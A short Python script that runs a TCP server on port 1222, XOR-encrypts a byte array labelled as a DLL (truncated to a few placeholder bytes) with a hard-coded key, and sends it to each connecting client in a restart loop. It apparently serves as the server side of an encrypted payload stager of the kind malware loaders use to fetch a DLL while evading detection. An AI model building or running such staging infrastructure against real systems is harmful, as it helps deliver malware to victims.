import socket
#Run in a loop on ur server 

dll = [
0x16, 0x54, 0x78, 0x78, 0x88, #...etc etc rest of dll
]


KEY = bytearray([0x12, 0x34, 0x56, 0x78, 0x9A, 0xBC, 0xDE, 0xF0]) 
DATA = bytearray(dll)
# Encrypt the byte array using XOR
def encrypt_data(data, key):
    encrypted_data = bytearray()
    for i in range(len(data)):
        encrypted_data.append(data[i] ^ key[i % len(key)])
    return encrypted_data

def stream_encrypted_data():
    encrypted_data = encrypt_data(DATA, KEY)

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 
    server_socket.bind(('0.0.0.0', 1222))
    server_socket.listen(1)
    print("Server started. Listening for incoming connections...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connected to client: {client_address}")

        client_socket.sendall(encrypted_data)
        print("Encrypted data sent to the client.")

        client_socket.close()
        print("Client connection closed.")


while True:
    try:
        stream_encrypted_data()
    except OSError as e:
        print(f"Error: {e}. Restarting the server...")
